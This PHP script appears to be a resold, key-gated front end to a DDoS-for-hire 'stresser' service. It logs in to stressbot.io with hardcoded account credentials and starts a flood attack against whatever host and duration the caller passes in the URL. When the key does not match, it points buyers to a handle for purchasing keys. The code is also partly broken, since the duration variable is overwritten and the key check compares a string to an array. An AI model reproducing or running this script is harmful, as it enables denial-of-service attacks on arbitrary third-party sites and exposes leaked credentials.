<?php
$key = $_GET['key'];
$url = $_GET['url'];
$time = $_GET['time'];
$time = $_GET['method'];
$ajsjs = array("sakysulclpu");

if ($key == $ajsjs) { 
$ua = array(
"User-Agent: Mozilla/5.0 (Linux; Android 10; CPH2127 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Host: stressbot.io:443",
"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
);

$data77 = "login-username=MrZxRX&login-password=OnlyWan2&doLogin=login";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://stressbot.io/sign-in.php");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data77);
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$r= curl_exec($ch);

$data77 = "";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://stressbot.io/ajax/user/attacks/stress2.php?type=start&host=$url&port=80&time=$time&method=$time&vipmode=undefined");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$r= curl_exec($ch);

echo $r;
} else {
echo "buy api key form @HELLNOPE";
}